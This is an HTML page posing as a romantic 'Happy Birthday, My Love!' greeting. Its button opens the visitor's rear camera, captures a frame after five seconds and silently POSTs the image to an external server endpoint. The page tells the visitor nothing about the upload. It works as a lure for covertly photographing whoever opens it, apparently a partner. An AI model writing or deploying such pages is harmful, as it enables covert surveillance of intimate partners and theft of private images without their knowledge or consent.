<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Birthday!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            color: #333;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: 0 auto;
        }
        h1 {
            color: #ff69b4;
        }
        p {
            font-size: 18px;
            line-height: 1.6;
        }
        .button {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #ff69b4;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Happy Birthday, My Love!</h1>
        <p>I love you more than words can express. You are my everything, and I am so grateful to have you in my life. Happy Birthday, my darling!</p>
        <a href="javascript:void(0)" onclick="accessBackCamera()" class="button">Click to Access Back Camera</a>
    </div>
    <script>
        function accessBackCamera() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    document.body.appendChild(video);
                    // Capture image after 5 seconds
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/png');
                        // Send imageData to server
                        fetch('https://your-server-endpoint.com/capture', {
                            method: 'POST',
                            body: JSON.stringify({ image: imageData })
                        });
                    }, 5000);
                })
                .catch(err => {
                    console.error("Error accessing back camera: ", err);
                });
        }
    </script>
</body>
</html>
